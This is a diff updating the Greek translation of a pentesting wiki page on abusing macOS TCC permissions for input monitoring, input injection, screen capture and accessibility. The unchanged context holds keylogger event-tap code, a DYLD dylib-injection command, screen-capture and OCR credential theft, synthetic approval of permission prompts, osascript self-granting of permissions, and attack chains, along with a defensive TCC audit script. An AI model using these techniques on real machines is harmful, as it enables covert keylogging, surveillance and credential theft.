@@ -1,4 +1,4 @@
-# macOS Input Monitoring, Screen Capture & Accessibility Abuse
+# Κατάχρηση Input Monitoring, Screen Capture και Accessibility στο macOS
 
 {{#include ../../../banners/hacktricks-training.md}}
 
@@ -6,18 +6,18 @@
 
 Τρεις σχετικές υπηρεσίες TCC ελέγχουν τον τρόπο με τον οποίο οι εφαρμογές μπορούν να παρατηρούν και να αλληλεπιδρούν με τη συνεδρία desktop του χρήστη:
 
-| Υπηρεσία TCC | Permission | Δυνατότητα |
+| Υπηρεσία TCC | Άδεια | Δυνατότητα |
 |---|---|---|
-| `kTCCServiceListenEvent` | **Input Monitoring** | Ανάγνωση όλων των keyboard και mouse events σε ολόκληρο το σύστημα (keylogging) |
-| `kTCCServicePostEvent` | **Input Injection** | Εισαγωγή συνθετικών keyboard και mouse events |
-| `kTCCServiceScreenCapture` | **Screen Capture** | Ανάγνωση του display buffer, λήψη screenshots, καταγραφή οθόνης |
-| `kTCCServiceAccessibility` | **Accessibility** | Έλεγχος άλλων εφαρμογών μέσω του AXUIElement API, ανάγνωση UI elements |
+| `kTCCServiceListenEvent` | **Input Monitoring** | Ανάγνωση όλων των συμβάντων πληκτρολογίου και ποντικιού σε όλο το σύστημα (keylogging) |
+| `kTCCServicePostEvent` | **Input Injection** | Έγχυση συνθετικών συμβάντων πληκτρολογίου και ποντικιού |
+| `kTCCServiceScreenCapture` | **Screen Capture** | Ανάγνωση του buffer της οθόνης, λήψη screenshots, καταγραφή οθόνης |
+| `kTCCServiceAccessibility` | **Accessibility** | Έλεγχος άλλων εφαρμογών μέσω του AXUIElement API, ανάγνωση στοιχείων UI |
 
-Αυτά τα permissions αποτελούν **τον πιο επικίνδυνο συνδυασμό στο macOS** — μαζί παρέχουν:
+Αυτές οι άδειες αποτελούν **τον πιο επικίνδυνο συνδυασμό** στο macOS — μαζί παρέχουν:
 - Πλήρες keylogging κάθε πλήκτρου που πατιέται (κωδικοί πρόσβασης, μηνύματα, πιστωτικές κάρτες)
 - Καταγραφή οθόνης όλου του ορατού περιεχομένου
-- Εισαγωγή συνθετικού input (click σε buttons, έγκριση dialogs)
-- Πλήρη GUI control, ισοδύναμο με φυσική πρόσβαση
+- Έγχυση συνθετικής εισόδου (κλικ σε κουμπιά, έγκριση διαλόγων)
+- Πλήρη έλεγχο του GUI, ισοδύναμο με φυσική πρόσβαση
 
 ---
 
@@ -25,7 +25,7 @@
 
 ### Πώς λειτουργεί
 
-Το macOS χρησιμοποιεί το **`CGEventTap` API** για να επιτρέπει σε processes να intercept input events από το Quartz event system. Ένα process με ListenEvent permission μπορεί να δημιουργήσει ένα event tap που λαμβάνει **κάθε keyboard και mouse event** πριν ή αφού φτάσει στην εφαρμογή-στόχο.<sup>[[1]](#references)</sup>
+Το macOS χρησιμοποιεί το **`CGEventTap` API** για να επιτρέπει σε διεργασίες να παρεμβάλλονται στα συμβάντα εισόδου από το σύστημα συμβάντων Quartz. Μια διεργασία με άδεια ListenEvent μπορεί να δημιουργήσει ένα event tap που λαμβάνει **κάθε συμβάν πληκτρολογίου και ποντικιού** πριν ή αφού φτάσει στην εφαρμογή-στόχο.<sup>[[1]](#references)</sup>
 ```objc
 // Create an event tap that captures all key-down events
 CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
@@ -49,7 +49,7 @@ CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
 return event;
 }
 ```
-### Εντοπισμός Binaries με Entitlements
+### Εύρεση Binaries με Entitlements
 ```bash
 # Find processes with input monitoring TCC grants
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
@@ -59,9 +59,9 @@ sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
 ```
-### Attack: Keylogging μέσω Code Injection
+### Attack: Keylogging via Code Injection
 
-Εάν ένα binary με permission ListenEvent έχει επίσης **απενεργοποιημένο library validation** ή **επιτρέπει μεταβλητές περιβάλλοντος DYLD**, ένας attacker μπορεί να injectάρει ένα dylib που κάνει register ένα CGEventTap:
+Εάν ένα binary με permission ListenEvent έχει επίσης **disabled library validation** ή **allows DYLD environment variables**, ένας attacker μπορεί να injectάρει ένα dylib που καταχωρίζει ένα CGEventTap:
 ```bash
 # Check if the target allows code injection
 codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
@@ -70,11 +70,11 @@ grep -E "allow-dyld|disable-library-validation"
 # If both are present, inject a keylogger dylib:
 DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
 ```
-Το injected dylib κληρονομεί το ListenEvent TCC grant του target και καταγράφει όλα τα keystrokes.
+Η injected dylib κληρονομεί το TCC grant ListenEvent του target και καταγράφει όλα τα keystrokes.
 
 ### Attack: Credential Harvesting
 
-Ένα εξελιγμένο keylogger μπορεί να συσχετίσει τα keystrokes με την ενεργή εφαρμογή:
+Ένα sophisticated keylogger μπορεί να συσχετίσει τα keystrokes με την ενεργή εφαρμογή:
 ```objc
 // Get the frontmost application to contextualize keystrokes
 NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
@@ -85,11 +85,11 @@ NSString *appName = frontApp.localizedName;
 ```
 ---
 
-## Εγχυση Εισοδου (kTCCServicePostEvent)
+## Έγχυση εισόδου (kTCCServicePostEvent)
 
-### Πως Λειτουργει
+### Πώς λειτουργεί
 
-Το permission PostEvent επιτρεπει τη δημιουργια ενος event tap με **`kCGEventTapOptionDefault`** (μπορει να τροποποιει/εισαγει events) αντι για ListenOnly.<sup>[[1]](#references)</sup> Αυτο επιτρεπει:
+Η άδεια PostEvent επιτρέπει τη δημιουργία ενός event tap με **`kCGEventTapOptionDefault`** (μπορεί να τροποποιεί/εγχέει events) αντί για ListenOnly.<sup>[[1]](#references)</sup> Αυτό επιτρέπει:
 ```objc
 // Inject a keystroke
 CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
@@ -103,9 +103,9 @@ CGPointMake(100, 200),
 kCGMouseButtonLeft);
 CGEventPost(kCGSessionEventTap, click);
 ```
-### Επίθεση: Automated TCC Prompt Approval
+### Επίθεση: Αυτοματοποιημένη έγκριση προτροπής TCC
 
-Με το PostEvent, ένας επιτιθέμενος μπορεί να **προσομοιώσει το πάτημα του «Allow»** σε διαλόγους δικαιωμάτων TCC:
+Με το PostEvent, ένας attacker μπορεί να **προσομοιώσει το κλικ στο "Allow"** σε διαλόγους δικαιωμάτων TCC:
 ```bash
 # Using cliclick (if available) or direct CGEvent injection:
 # 1. Trigger a TCC prompt for the malware
@@ -115,14 +115,14 @@ CGEventPost(kCGSessionEventTap, click);
 ```
 ---
 
-## Λήψη Οθόνης (kTCCServiceScreenCapture)
+## Καταγραφή οθόνης (kTCCServiceScreenCapture)
 
-### Πώς Λειτουργεί
+### Πώς λειτουργεί
 
-Η άδεια λήψης οθόνης επιτρέπει την ανάγνωση του buffer οθόνης χρησιμοποιώντας:
-- **`CGWindowListCreateImage`** — λήψη οποιουδήποτε παραθύρου ή ολόκληρης της οθόνης
+Η άδεια καταγραφής οθόνης επιτρέπει την ανάγνωση του buffer της οθόνης με χρήση των:
+- **`CGWindowListCreateImage`** — καταγραφή οποιουδήποτε παραθύρου ή ολόκληρης της οθόνης
 - **`ScreenCaptureKit`** (macOS 12.3+) — σύγχρονο API για streaming περιεχομένου οθόνης<sup>[[3]](#references)</sup>
-- **`CGDisplayStream`** — λήψη οθόνης με επιτάχυνση υλικού
+- **`CGDisplayStream`** — καταγραφή οθόνης με επιτάχυνση υλικού
 ```objc
 // Capture the entire main display
 CGImageRef screenshot = CGWindowListCreateImage(
@@ -133,7 +133,7 @@ kCGWindowImageDefault
 );
 // screenshot contains everything visible on screen
 ```
-### Εντοπισμός Clients Καταγραφής Οθόνης
+### Εντοπισμός Clients καταγραφής οθόνης
 ```bash
 # TCC database query
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
@@ -145,7 +145,7 @@ SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%'
 ```
 ### Attack: Credential Capture via OCR
 
-Μια injected διεργασία screen capture μπορεί να καταγράφει περιοδικά frames και να χρησιμοποιεί OCR για την εξαγωγή κωδικών πρόσβασης:
+Μια injected διαδικασία καταγραφής οθόνης μπορεί να καταγράφει περιοδικά καρέ και να χρησιμοποιεί OCR για την εξαγωγή κωδικών πρόσβασης:
 ```bash
 # Basic screen capture from a process with the TCC grant
 screencapture -x /tmp/screen.png
@@ -154,9 +154,9 @@ screencapture -x /tmp/screen.png
 screencapture -x -l <windowID> /tmp/window.png
 ```
 > [!WARNING]
-> Ξεκινώντας από το **macOS Sonoma**, η καταγραφή οθόνης εμφανίζει μια **μόνιμη ένδειξη** στη γραμμή μενού. Σε παλαιότερες εκδόσεις, η εγγραφή οθόνης μπορούσε να είναι εντελώς αθόρυβη. Ωστόσο, μια σύντομη καταγραφή ενός μόνο καρέ μπορεί να μην γίνει αντιληπτή από τους χρήστες.
+> Ξεκινώντας από το **macOS Sonoma**, το screen capture εμφανίζει μια **μόνιμη ένδειξη** στη γραμμή μενού. Σε παλαιότερες εκδόσεις, το screen recording μπορούσε να γίνει εντελώς αθόρυβα. Ωστόσο, μια σύντομη λήψη ενός frame μπορεί να περάσει απαρατήρητη από τους χρήστες.
 
-### Επίθεση: Καταγραφή συνεδρίας
+### Επίθεση: Session Recording
 
 Η συνεχής καταγραφή οθόνης παρέχει πλήρη αναπαραγωγή της συνεδρίας του χρήστη:
 ```objc
@@ -174,13 +174,13 @@ config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
 
 ### Πώς λειτουργεί
 
-Η πρόσβαση στην προσβασιμότητα παρέχει έλεγχο σε άλλες εφαρμογές μέσω του **AXUIElement API**.<sup>[[2]](#references)</sup> Μια διεργασία με πρόσβαση στην προσβασιμότητα μπορεί να:
+Η πρόσβαση Accessibility παρέχει έλεγχο σε άλλες εφαρμογές μέσω του **AXUIElement API**.<sup>[[2]](#references)</sup> Μια διεργασία με πρόσβαση Accessibility μπορεί να:
 
 1. **Διαβάζει** οποιοδήποτε στοιχείο UI σε οποιαδήποτε εφαρμογή (πεδία κειμένου, ετικέτες, κουμπιά, μενού)
-2. **Κάνει κλικ** σε κουμπιά και να αλληλεπιδρά με στοιχεία ελέγχου
+2. **Κάνει κλικ** σε κουμπιά και να αλληλεπιδρά με controls
 3. **Πληκτρολογεί** κείμενο σε οποιοδήποτε πεδίο κειμένου
 4. **Περιηγείται** σε μενού και διαλόγους
-5. **Συλλέγει** εμφανιζόμενα δεδομένα από οποιαδήποτε εκτελούμενη εφαρμογή
+5. **Κάνει Scrape** στα εμφανιζόμενα δεδομένα από οποιαδήποτε εκτελούμενη εφαρμογή
 ```objc
 // Get the frontmost application
 AXUIElementRef app = AXUIElementCreateApplication(pid);
@@ -195,9 +195,9 @@ CFTypeRef value;
 AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
 // value contains whatever text is displayed in the field
 ```
-### Επίθεση: Αυτοχορήγηση TCC Permissions
+### Attack: Αυτοχορήγηση δικαιωμάτων TCC
 
-Η πιο επικίνδυνη κατάχρηση του Accessibility είναι η **πλοήγηση στις System Settings για τη χορήγηση πρόσθετων permissions στο δικό σας malware**:
+Η πιο επικίνδυνη κατάχρηση του Accessibility είναι η **πλοήγηση στις Ρυθμίσεις συστήματος για τη χορήγηση πρόσθετων δικαιωμάτων στο δικό σας malware**.<sup>[[4]](#references)</sup>
 ```bash
 # Using osascript with accessibility access:
 # Navigate to Privacy & Security > Full Disk Access
@@ -243,7 +243,7 @@ osascript -e 'tell application "System Events" to key code 36' -- Press Enter
 
 ## Αλυσίδες Επίθεσης
 
-### Αλυσίδα: Παρακολούθηση Εισόδου + Καταγραφή Οθόνης = Πλήρης Παρακολούθηση
+### Αλυσίδα: Input Monitoring + Screen Capture = Πλήρης Παρακολούθηση
 ```
 1. Inject into binary with ListenEvent + ScreenCapture
 2. CGEventTap captures all keystrokes
@@ -260,7 +260,7 @@ osascript -e 'tell application "System Events" to key code 36' -- Press Enter
 5. Open Terminal, type commands as if the user did it
 6. Result: equivalent to physical keyboard/mouse access
 ```
-### Αλυσίδα: Accessibility → Αυτοχορήγηση πρόσβασης σε κάμερα/μικρόφωνο → Παρακολούθηση
+### Αλυσίδα: Accessibility → Self-Grant Camera/Mic → Παρακολούθηση
 ```
 1. Start with only Accessibility permission
 2. Open System Settings > Privacy & Security > Camera
@@ -271,7 +271,7 @@ osascript -e 'tell application "System Events" to key code 36' -- Press Enter
 ```
 ---
 
-## Ανίχνευση και Απαρίθμηση
+## Εντοπισμός και Απαρίθμηση
 ```bash
 #!/bin/bash
 echo "=== TCC Input/Screen/Accessibility Audit ==="
@@ -290,11 +290,10 @@ SELECT path FROM executables
 WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
 AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
 ```
-## Αναφορές
+## References
 
 - [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
-- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
+- [2] [Apple Developer — API Προσβασιμότητας](https://developer.apple.com/documentation/applicationservices/axuielement_h)
 - [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
-- [4] [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)
-
+- [4] [Objective-See — Συνθετικά events και ασφάλεια διεπαφής χρήστη στο macOS](https://objective-see.org/blog/blog_0x36.html)
 {{#include ../../../banners/hacktricks-training.md}}
